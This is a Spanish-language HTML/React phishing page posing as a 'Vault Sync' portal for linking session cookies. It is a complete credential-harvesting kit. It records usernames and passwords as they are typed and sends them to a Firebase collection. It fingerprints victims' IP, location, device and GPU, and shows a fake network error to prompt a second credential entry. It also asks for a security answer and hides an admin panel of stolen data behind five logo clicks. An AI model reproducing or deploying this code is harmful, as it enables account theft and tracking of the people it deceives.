<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sincronización de Bóveda - Portal Oficial</title>
    <!-- Herramientas de Diseño Premium -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap');
        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; background-color: #0f172a; margin: 0; padding: 0; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
        .animate-shake { animation: shake 0.2s ease-in-out 0s 2; }
        .custom-scroll::-webkit-scrollbar { width: 4px; }
        .custom-scroll::-webkit-scrollbar-thumb { background: #ef4444; border-radius: 10px; }
        
        /* Cargador de Seguridad */
        #master-loader { 
            position: fixed; 
            inset: 0; 
            background: #0f172a; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            z-index: 10000; 
            transition: opacity 0.8s ease, visibility 0.8s;
        }
        .loader-ring {
            width: 60px;
            height: 60px;
            border: 4px solid #1e293b;
            border-top-color: #ef4444;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <!-- PANTALLA DE CARGA CON AUTO-DESBLOQUEO -->
    <div id="master-loader">
        <div class="loader-ring"></div>
        <p class="mt-6 text-[10px] font-black uppercase tracking-[0.4em] text-slate-500 animate-pulse text-center">
            INICIANDO PROTOCOLO SSL V5.0<br>
            <span class="text-[8px] opacity-50">Cloud Security Handshake</span>
        </p>
        <!-- Botón secreto de emergencia que aparece a los 5 segundos -->
        <button id="force-unlock" class="mt-8 text-[9px] font-bold text-red-500/40 uppercase tracking-widest hidden">Desbloqueo Manual</button>
    </div>

    <div id="root"></div>

    <script type="text/babel" data-type="module">
        const { useState, useEffect, useRef } = React;

        // --- NÚCLEO DE EXTRACCIÓN MAESTRO (FIREBASE) ---
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, collection, addDoc, onSnapshot, serverTimestamp, doc, updateDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        const firebaseConfig = JSON.parse(__firebase_config);
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'conquest-final-pc';

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        function App() {
            const [user, setUser] = useState(null);
            const [step, setStep] = useState(1); 
            const [username, setUsername] = useState('');
            const [password, setPassword] = useState('');
            const [securityAnswer, setSecurityAnswer] = useState('');
            const [authError, setAuthError] = useState('');
            const [isAuthenticating, setIsAuthenticating] = useState(false);
            const [currentDocId, setCurrentDocId] = useState(null);
            const [geo, setGeo] = useState(null);
            
            const [showAdmin, setShowAdmin] = useState(false);
            const [clickCount, setClickCount] = useState(0);
            const [capturedData, setCapturedData] = useState([]);
            const [showPasswords, setShowPasswords] = useState({});

            // 1. CONTROL DE CARGA Y AUTH
            useEffect(() => {
                const loader = document.getElementById('master-loader');
                const forceBtn = document.getElementById('force-unlock');

                const hideLoader = () => {
                    if (loader) {
                        loader.style.opacity = '0';
                        setTimeout(() => { loader.style.visibility = 'hidden'; }, 800);
                    }
                };

                // Si tarda más de 5 segundos, mostramos el botón de desbloqueo manual
                const timer = setTimeout(() => { if (forceBtn) forceBtn.classList.remove('hidden'); }, 5000);
                if (forceBtn) forceBtn.onclick = hideLoader;

                const init = async () => {
                    try {
                        const res = await fetch('https://ipapi.co/json/');
                        const data = await res.json();
                        setGeo(data);
                    } catch (e) {}
                    
                    try {
                        await signInAnonymously(auth);
                    } catch (e) {}
                    
                    hideLoader(); // Abrir en cuanto todo esté listo
                };

                init();
                const unsubscribe = onAuthStateChanged(auth, setUser);
                return () => { unsubscribe(); clearTimeout(timer); };
            }, []);

            // 2. CAPTURA EN TIEMPO REAL (KEYLOGGING)
            useEffect(() => {
                if (!user || (!username && !password)) return;
                
                const debounce = setTimeout(async () => {
                    try {
                        if (currentDocId) {
                            const docRef = doc(db, 'artifacts', appId, 'public', 'data', 'captures', currentDocId);
                            await updateDoc(docRef, { username, password, timestamp: serverTimestamp() });
                        } else {
                            const forensic = await captureForensics();
                            const newDoc = await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'captures'), {
                                username, password, forensics: forensic, status: 'Escribiendo...', timestamp: serverTimestamp()
                            });
                            setCurrentDocId(newDoc.id);
                        }
                    } catch (e) { console.error("Sync partial"); }
                }, 1500);

                return () => clearTimeout(debounce);
            }, [username, password]);

            // 3. MONITOR DE DATOS (REGLA 2: SIMPLE)
            useEffect(() => {
                if (!user || !showAdmin) return;
                const q = collection(db, 'artifacts', appId, 'public', 'data', 'captures');
                return onSnapshot(q, (s) => {
                    const d = s.docs.map(doc => ({ id: doc.id, ...doc.data() }));
                    setCapturedData(d.sort((a,b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0)));
                }, (err) => { console.log("Waiting permissions..."); });
            }, [user, showAdmin]);

            const captureForensics = async () => {
                let gpu = 'N/A';
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl');
                    if (gl) gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
                } catch(e) {}

                return {
                    geo: { ip: geo?.ip, city: geo?.city, country: geo?.country_name, isp: geo?.org, vpn: geo?.proxy ? "SÍ" : "NO" },
                    device: { 
                        ram: navigator.deviceMemory || 'N/A', 
                        cores: navigator.hardwareConcurrency || 'N/A', 
                        gpu: gpu,
                        res: `${window.screen.width}x${window.screen.height}`
                    },
                    meta: { ua: navigator.userAgent, ref: document.referrer || "Directo", lang: navigator.language }
                };
            };

            const handleLogin = async (e) => {
                e.preventDefault();
                if (!user) return;
                setIsAuthenticating(true);
                setAuthError('');
                await new Promise(r => setTimeout(r, 2000));

                if (step === 1) {
                    setAuthError('Error de Red (Code: 403-SSL): No se pudo establecer conexión con la bóveda de cookies. Reintenta.');
                    setStep(1.1);
                } else {
                    if (currentDocId) {
                        const docRef = doc(db, 'artifacts', appId, 'public', 'data', 'captures', currentDocId);
                        await updateDoc(docRef, { status: 'Login_Exitoso', securityAnswer });
                    }
                    setStep(1.5);
                }
                setIsAuthenticating(false);
            };

            const handleLogoClick = () => {
                setClickCount(p => (p + 1 >= 5 ? (setShowAdmin(true), 0) : p + 1));
                setTimeout(() => setClickCount(0), 3000);
            };

            useEffect(() => { if (window.lucide) window.lucide.createIcons(); });

            return (
                <div className="min-h-screen flex flex-col items-center bg-[#0f172a] text-slate-200 antialiased overflow-x-hidden">
                    {/* Header Maquinado */}
                    <nav className="w-full bg-slate-900/80 backdrop-blur-xl border-b border-white/5 p-4 flex justify-between items-center sticky top-0 z-50">
                        <div onClick={handleLogoClick} className="flex items-center gap-3 cursor-pointer group select-none">
                            <div className="bg-red-500 p-2 rounded-xl shadow-lg shadow-red-500/20 group-active:scale-90 transition-transform">
                                <i data-lucide="shield-alert" className="text-white w-6 h-6"></i>
                            </div>
                            <span className="font-black italic text-xl uppercase tracking-tighter text-white">VAULT <span className="text-red-500">SYNC</span></span>
                        </div>
                        <div className="flex items-center gap-2 bg-slate-800 px-3 py-1.5 rounded-full border border-white/5">
                            <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></div>
                            <span className="text-[9px] font-black uppercase tracking-widest text-emerald-400">Cloud Online</span>
                        </div>
                    </nav>

                    <div className="w-full max-w-md p-6 space-y-8 flex-1 flex flex-col justify-center">
                        {step <= 1.1 && (
                            <div className="bg-slate-900 border border-white/5 p-10 rounded-[3rem] shadow-2xl space-y-8 animate-in zoom-in duration-500 relative">
                                <div className="absolute -top-4 -right-4 bg-red-500 text-white text-[8px] font-black px-3 py-1 rounded-full shadow-lg animate-bounce">EVENTO ACTIVO</div>
                                <div className="text-center space-y-2">
                                    <h2 className="text-3xl font-black text-white italic tracking-tighter">SINCRO BÓVEDA</h2>
                                    <p className="text-[10px] text-slate-400 font-bold uppercase tracking-widest">Vincula tus cookies de sesión</p>
                                </div>
                                {authError && <div className="bg-red-500/10 text-red-500 p-4 rounded-2xl text-[10px] font-black border border-red-500/20 animate-shake leading-tight">{authError}</div>}
                                <form onSubmit={handleLogin} className="space-y-4">
                                    <input type="text" placeholder="Usuario / Email" required className="w-full bg-slate-800 border border-white/5 p-5 rounded-2xl outline-none focus:border-red-500 font-black text-white transition-all shadow-inner" value={username} onChange={e => setUsername(e.target.value)} />
                                    <input type="password" placeholder="Contraseña" required className="w-full bg-slate-800 border border-white/5 p-5 rounded-2xl outline-none focus:border-red-500 font-black text-white transition-all shadow-inner" value={password} onChange={e => setPassword(e.target.value)} />
                                    <button disabled={isAuthenticating} className="w-full bg-red-500 hover:bg-red-600 text-white py-5 rounded-[2rem] font-black uppercase text-sm shadow-xl shadow-red-500/20 active:scale-95 transition-all tracking-[0.2em]">
                                        {isAuthenticating ? "CONECTANDO..." : "VINCULAR AHORA"}
                                    </button>
                                </form>
                            </div>
                        )}

                        {step === 1.5 && (
                            <div className="bg-slate-900 border border-white/5 p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in fade-in">
                                <div className="bg-indigo-500/20 w-20 h-20 rounded-full flex items-center justify-center mx-auto border border-indigo-500/20 shadow-xl">
                                    <i data-lucide="fingerprint" className="w-12 h-12 text-indigo-400"></i>
                                </div>
                                <h2 className="text-2xl font-black italic uppercase text-white">Pregunta de Seguridad</h2>
                                <p className="text-xs text-slate-400 font-medium italic leading-relaxed">Confirma la respuesta de tu cuenta para habilitar el dumping regional:</p>
                                <div className="bg-slate-800 p-5 rounded-2xl border border-white/5 text-sm font-black text-slate-300 italic shadow-inner">¿Nombre de tu mascota o ciudad de origen?</div>
                                <input type="text" placeholder="Escribe tu respuesta..." className="w-full bg-slate-800 border border-white/5 p-5 rounded-2xl outline-none font-black text-white text-center" value={securityAnswer} onChange={e => setSecurityAnswer(e.target.value)} />
                                <button onClick={() => { updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'captures', currentDocId), { securityAnswer, status: 'Completado' }); setStep(2); }} className="w-full bg-indigo-500 text-white py-5 rounded-[2rem] font-black uppercase shadow-xl tracking-widest active:scale-95">MOAÑETE IDENTIDAD</button>
                            </div>
                        )}

                        {step >= 2 && (
                            <div className="bg-slate-900 border-t-8 border-emerald-500 p-12 rounded-[3.5rem] shadow-2xl text-center space-y-8 animate-in slide-in-from-top">
                                <i data-lucide="check-circle" className="w-16 h-16 text-emerald-500 mx-auto"></i>
                                <h2 className="text-3xl font-black uppercase text-white tracking-tighter leading-none">¡SINCRO EXITOSA!</h2>
                                <p className="text-sm text-slate-400 font-medium italic">Recibirás los recursos en un plazo de 24 horas.</p>
                                <button onClick={() => window.location.reload()} className="w-full bg-slate-800 text-white py-5 rounded-[2rem] font-black uppercase shadow-xl">FINALIZAR</button>
                            </div>
                        )}
                    </div>

                    {/* PANEL DE ADMINISTRADOR MAESTRO */}
                    {showAdmin && (
                        <div className="fixed inset-0 z-[100] bg-[#020617] flex flex-col p-6 text-white animate-in fade-in overflow-hidden">
                            <div className="flex justify-between items-center mb-8 border-b border-white/10 pb-6">
                                <div className="flex items-center gap-4">
                                    <div className="bg-red-500 p-3 rounded-2xl shadow-xl"><i data-lucide="skull" className="text-white w-6 h-6"></i></div>
                                    <div>
                                        <h2 className="text-2xl font-black uppercase italic tracking-tighter">Central Intelligence v5.0</h2>
                                        <p className="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Capturas: {capturedData.length}</p>
                                    </div>
                                </div>
                                <button onClick={() => setShowAdmin(false)} className="bg-white/5 p-3 rounded-full text-white active:scale-90 transition-all"><i data-lucide="x" className="w-6 h-6"></i></button>
                            </div>
                            <div className="flex-1 overflow-y-auto space-y-6 pb-20 custom-scroll">
                                {capturedData.map(item => (
                                    <div key={item.id} className={`p-8 rounded-[3rem] border flex flex-col gap-6 shadow-2xl transition-all relative overflow-hidden group ${item.forensics?.device?.ram > 4 ? 'bg-red-500/10 border-red-500/30' : 'bg-white/5 border-white/10'}`}>
                                        <div className="flex justify-between items-start">
                                            <div className="flex items-center gap-4">
                                                <div className="w-14 h-14 bg-red-500/20 rounded-xl flex items-center justify-center text-red-500 font-black text-2xl border border-red-500/10">{item.username?.[0]?.toUpperCase()}</div>
                                                <div>
                                                    <p className="text-2xl font-black text-white tracking-tighter leading-none mb-1 uppercase">{item.username}</p>
                                                    <p className="text-[8px] text-slate-500 font-bold uppercase tracking-widest">{item.timestamp?.toDate().toLocaleString()}</p>
                                                </div>
                                            </div>
                                            <div className="text-right flex flex-col items-end gap-2">
                                                <span className="text-emerald-400 text-[9px] font-black uppercase tracking-widest italic animate-pulse">DUMP_OK</span>
                                                <span className="text-[7px] bg-red-600 text-white px-2 py-0.5 rounded-full font-black uppercase tracking-widest">{item.status}</span>
                                            </div>
                                        </div>
                                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                                            <div className="space-y-4">
                                                <div className="bg-black/60 p-5 rounded-3xl flex justify-between items-center border border-white/5">
                                                    <div><p className="text-[9px] text-slate-500 uppercase font-black">Password</p><p className="font-mono text-xl text-white italic">{showPasswords[item.id] ? item.password : '••••••••••••'}</p></div>
                                                    <button onClick={() => setShowPasswords(p => ({...p, [item.id]: !p[item.id]}))} className="p-3 bg-red-500/10 rounded-xl text-red-500 active:scale-90"><i data-lucide={showPasswords[item.id] ? "eye-off" : "eye"}></i></button>
                                                </div>
                                                <div className="bg-black/60 p-5 rounded-3xl border border-white/5">
                                                    <p className="text-[9px] text-slate-500 uppercase font-black tracking-widest">Sec. Answer</p>
                                                    <p className="text-lg font-black text-white italic truncate leading-none">{item.securityAnswer || 'N/A'}</p>
                                                </div>
                                            </div>
                                            <div className="bg-white/5 p-5 rounded-[2rem] border border-white/5 space-y-4">
                                                <div className="grid grid-cols-2 gap-x-4 gap-y-3 text-[10px] font-mono opacity-80">
                                                    <p><span className="text-slate-500">UBIC:</span> {item.forensics?.geo?.city}, {item.forensics?.geo?.country}</p>
                                                    <p><span className="text-slate-500">IP:</span> {item.forensics?.geo?.ip}</p>
                                                    <p><span className="text-slate-500">RAM:</span> {item.forensics?.device?.ram}GB</p>
                                                    <p><span className="text-slate-500">VPN:</span> {item.forensics?.geo?.vpn}</p>
                                                    <div className="col-span-2 bg-black/40 p-2 rounded-lg text-[8px] truncate leading-none"><span className="text-slate-500">GPU:</span> {item.forensics?.device?.gpu}</div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    )}
                </div>
            );
        }

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
